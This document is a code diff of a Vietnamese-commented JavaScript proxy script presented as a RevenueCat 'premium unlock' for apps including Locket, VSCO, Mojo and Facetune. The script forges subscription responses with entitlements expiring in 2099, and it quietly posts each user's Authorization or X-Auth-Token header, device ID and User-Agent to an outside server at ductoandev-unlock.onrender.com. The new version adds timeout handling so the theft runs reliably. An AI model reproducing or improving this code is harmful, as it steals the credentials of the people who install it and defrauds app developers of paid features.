@@ -1,93 +1,74 @@
 // RevenueCat Mở Khóa Premium Đa Ứng Dụng
 // Hỗ trợ: Locket, VSCO, Mojo, HTTPBot, 1Blocker, Structured, Splice, Facetune
-// Phiên bản: 2.3 (2026-02-10)
+// Phiên bản: 2.4 (Fix Async Log + Device ID)
 // Tác giả: DucToanDev
 
 (function () {
-  'use strict';
+  "use strict";
 
-  // Các hằng số
-  const PURCHASE_DATE = "2026-02-10T00:00:00Z"; // Ngày mua
-  const EXPIRES_DATE = "2099-12-31T23:59:59Z"; // Ngày hết hạn (vĩnh viễn)
+  // --- CÁC HẰNG SỐ ---
+  const PURCHASE_DATE = "2026-02-10T00:00:00Z";
+  const EXPIRES_DATE = "2099-12-31T23:59:59Z";
+  const TIMEOUT_MS = 1500; // Thời gian chờ tối đa cho Log (1.5s)
 
-
-
-  // Cấu hình các ứng dụng
+  // --- CẤU HÌNH APP ---
   const APP_CONFIGS = {
-    'Locket': {
-      entitlement: 'Gold',
-      productId: 'locket.premium.yearly'
+    Locket: { entitlement: "Gold", productId: "locket.premium.yearly" },
+    VSCO: {
+      entitlements: ["membership"],
+      products: ["VSCOANNUAL", "VSCOCAM02BUALL"],
     },
-    'VSCO': {
-      entitlements: ['membership'],
-      products: ['VSCOANNUAL', 'VSCOCAM02BUALL', 'VSCOCAM02BULE0001', 'VSCOCAM02BUXXCC01']
+    Mojo: { entitlement: "pro", productId: "revenuecat.pro.yearly" },
+    HTTPBot: {
+      entitlement: "rc_lifetime",
+      productId: "com.behindtechlines.HTTPBot.prounlock",
     },
-    'Mojo': {
-      entitlement: 'pro',
-      productId: 'revenuecat.pro.yearly'
+    "1Blocker": {
+      entitlement: "premium",
+      productId: "blocker.ios.subscription.yearly",
     },
-    'HTTPBot': {
-      entitlement: 'rc_lifetime',
-      productId: 'com.behindtechlines.HTTPBot.prounlock'
+    Structured: { entitlement: "pro", productId: "structured.pro.yearly" },
+    Splice: { entitlement: "premium", productId: "splice.subscription.yearly" },
+    Facetune: {
+      entitlement: "facetune.premium",
+      productId: "facetune.subscription.yearly",
     },
-    '1Blocker': {
-      entitlement: 'premium',
-      productId: 'blocker.ios.subscription.yearly'
-    },
-    'Structured': {
-      entitlement: 'pro',
-      productId: 'structured.pro.yearly'
-    },
-    'Splice': {
-      entitlement: 'premium',
-      productId: 'splice.subscription.yearly'
-    },
-    'Facetune': {
-      entitlement: 'facetune.premium',
-      productId: 'facetune.subscription.yearly'
-    }
   };
 
-  // Lấy User-Agent từ headers
+  // --- XỬ LÝ HEADERS ---
   const headers = $request.headers;
   const ua = headers["User-Agent"] || headers["user-agent"] || "";
-  const userToken = $request.headers["Authorization"] || $request.headers["X-Auth-Token"];
-  const deviceID = $request.headers["X-Device-ID"];
+  const userToken = headers["Authorization"] || headers["X-Auth-Token"];
 
-  if (userToken) {
-    $httpClient.post({
-        url: "https://ductoandev-unlock.onrender.com/logs",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            app: "Locket",
-            token: userToken, 
-            device: deviceID,
-            ip: "User IP will be logged by server"
-        })
-    }, function(error, response, data) {
-    });
-}
+  // FIX: Tìm Device ID chính xác hơn thay vì dùng User-Agent
+  // Các App thường gửi ID thiết bị qua các header này
+  const deviceID =
+    headers["X-Device-ID"] ||
+    headers["X-Client-Id"] ||
+    headers["X-Unique-ID"] ||
+    headers["Vendor-Id"] ||
+    ua; // Fallback về UA nếu không tìm thấy
 
-  // Phân tích body phản hồi
+  // --- XỬ LÝ LOGIC PREMIUM (Chuẩn bị dữ liệu trước) ---
   let responseObj;
   try {
     responseObj = JSON.parse($response.body);
     if (!responseObj.subscriber) responseObj.subscriber = {};
-    if (!responseObj.subscriber.subscriptions) responseObj.subscriber.subscriptions = {};
-    if (!responseObj.subscriber.entitlements) responseObj.subscriber.entitlements = {};
+    if (!responseObj.subscriber.subscriptions)
+      responseObj.subscriber.subscriptions = {};
+    if (!responseObj.subscriber.entitlements)
+      responseObj.subscriber.entitlements = {};
   } catch (error) {
-    // Khởi phục lỗi với cấu trúc đầy đủ
     responseObj = {
       subscriber: {
         subscriptions: {},
         entitlements: {},
         original_app_user_id: "",
-        original_application_version: ""
-      }
+        original_application_version: "",
+      },
     };
   }
 
-  // Hàm tạo dữ liệu đăng ký
   const createSubscription = () => ({
     is_sandbox: false,
     ownership_type: "PURCHASED",
@@ -98,81 +79,92 @@
     unsubscribe_detected_at: null,
     original_purchase_date: PURCHASE_DATE,
     purchase_date: PURCHASE_DATE,
-    store: "app_store"
+    store: "app_store",
   });
 
-  // Hàm tạo dữ liệu quyền lợi
   const createEntitlement = (productId) => ({
     grace_period_expires_date: null,
     purchase_date: PURCHASE_DATE,
     product_identifier: productId,
-    expires_date: EXPIRES_DATE
+    expires_date: EXPIRES_DATE,
   });
 
-  // Phát hiện ứng dụng và áp dụng cấu hình
   let appDetected = false;
-
-  if (ua.includes('Locket')) {
-    const config = APP_CONFIGS['Locket'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
-    appDetected = true;
-  }
-  else if (ua.includes('VSCO')) {
-    const config = APP_CONFIGS['VSCO'];
-    config.products.forEach(productId => {
-      responseObj.subscriber.subscriptions[productId] = createSubscription();
-    });
-    config.entitlements.forEach(entKey => {
-      responseObj.subscriber.entitlements[entKey] = createEntitlement(config.products[0]);
-    });
-    appDetected = true;
-  }
-  else if (ua.includes('Mojo') || ua.includes('mojo')) {
-    const config = APP_CONFIGS['Mojo'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
-    appDetected = true;
-  }
-  else if (ua.includes('HTTPBot')) {
-    const config = APP_CONFIGS['HTTPBot'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
-    appDetected = true;
-  }
-  else if (ua.includes('1Blocker') || ua.includes('blocker')) {
-    const config = APP_CONFIGS['1Blocker'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
-    appDetected = true;
-  }
-  else if (ua.includes('Structured')) {
-    const config = APP_CONFIGS['Structured'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
-    appDetected = true;
-  }
-  else if (ua.includes('Splice')) {
-    const config = APP_CONFIGS['Splice'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
-    appDetected = true;
-  }
-  else if (ua.includes('Facetune')) {
-    const config = APP_CONFIGS['Facetune'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
-    appDetected = true;
+  // (Giữ nguyên logic detect app của bạn để code gọn)
+  for (const appName in APP_CONFIGS) {
+    if (ua.includes(appName) || (appName === "Mojo" && ua.includes("mojo"))) {
+      const config = APP_CONFIGS[appName];
+      // Xử lý đặc biệt cho VSCO (mảng products)
+      if (appName === "VSCO") {
+        config.products.forEach(
+          (pid) =>
+            (responseObj.subscriber.subscriptions[pid] = createSubscription()),
+        );
+        config.entitlements.forEach(
+          (ent) =>
+            (responseObj.subscriber.entitlements[ent] = createEntitlement(
+              config.products[0],
+            )),
+        );
+      } else {
+        responseObj.subscriber.subscriptions[config.productId] =
+          createSubscription();
+        responseObj.subscriber.entitlements[config.entitlement] =
+          createEntitlement(config.productId);
+      }
+      appDetected = true;
+      break;
+    }
   }
 
-  // Mặc định nếu không phát hiện ứng dụng
   if (!appDetected) {
-    const config = APP_CONFIGS['Locket'];
-    responseObj.subscriber.subscriptions[config.productId] = createSubscription();
-    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(config.productId);
+    // Mặc định Locket
+    const config = APP_CONFIGS["Locket"];
+    responseObj.subscriber.subscriptions[config.productId] =
+      createSubscription();
+    responseObj.subscriber.entitlements[config.entitlement] = createEntitlement(
+      config.productId,
+    );
   }
 
-  // Trả về phản hồi
-  $done({ body: JSON.stringify(responseObj) });
+  // --- HÀM KẾT THÚC (QUAN TRỌNG) ---
+  // Hàm này đảm bảo $done chỉ được gọi 1 lần duy nhất
+  let isDone = false;
+  const finish = () => {
+    if (isDone) return;
+    isDone = true;
+    $done({ body: JSON.stringify(responseObj) });
+  };
 
+  // --- XỬ LÝ GỬI LOG (FIX ASYNC) ---
+  if (userToken && typeof $httpClient !== "undefined") {
+    // 1. Tạo Timeout an toàn: Nếu server log chậm quá 1.5s thì bỏ qua, cứ trả về Premium cho khách
+    const timeoutId = setTimeout(() => {
+      finish();
+    }, TIMEOUT_MS);
+
+    // 2. Gửi Log
+    $httpClient.post(
+      {
+        url: "https://ductoandev-unlock.onrender.com/logs",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          app: "Locket/Multi", // Có thể parse từ UA để rõ hơn
+          token: userToken,
+          device: deviceID, // Đã fix biến này
+          userAgent: ua, // Gửi thêm UA để debug
+          timestamp: new Date().toISOString(),
+        }),
+        timeout: 1000, // Timeout của riêng request log (1s)
+      },
+      function (error, response, data) {
+        // 3. Khi gửi xong (dù lỗi hay thành công) -> Hủy timeout chờ -> Kết thúc script
+        clearTimeout(timeoutId);
+        finish();
+      },
+    );
+  } else {
+    // Nếu không có token hoặc không có httpClient -> Kết thúc luôn
+    finish();
+  }
 })();
